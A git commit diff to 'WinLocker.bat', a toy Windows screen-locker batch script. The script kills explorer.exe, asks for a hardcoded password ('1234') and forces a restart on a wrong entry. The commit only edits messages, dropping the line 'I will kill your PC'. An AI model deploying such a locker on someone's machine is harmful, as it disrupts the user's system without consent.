27899e492530ef9dc53d7989baf667fcb1761667
Serrr0001 <97906837+Serrr0001@users.noreply.github.com>
2022-03-08 19:15:27 +0500

    Update WinLocker.bat

--- WinLocker.bat
+++ WinLocker.bat
@@ -3,24 +3,22 @@ Taskkill/f /im explorer.exe
 color 4
 :main menu
 title WinLocker
-echo Hello. It's just WINLOCKER.
+echo Hello. It's just WINLOCKER
 pause
 Taskkill/f /im explorer.exe
 Title WinLocker
 color 12
 
-echo Enter password.
+echo Enter password
 
 :loop
 set/p x=
 if %x%==1234 (
 echo Okay, it's correct password...
-echo win start
 start explorer
 exit
 ) else (
 echo Incorrect password!
-echo I will kill your PC.
 shutdown /r
 )
 goto loop
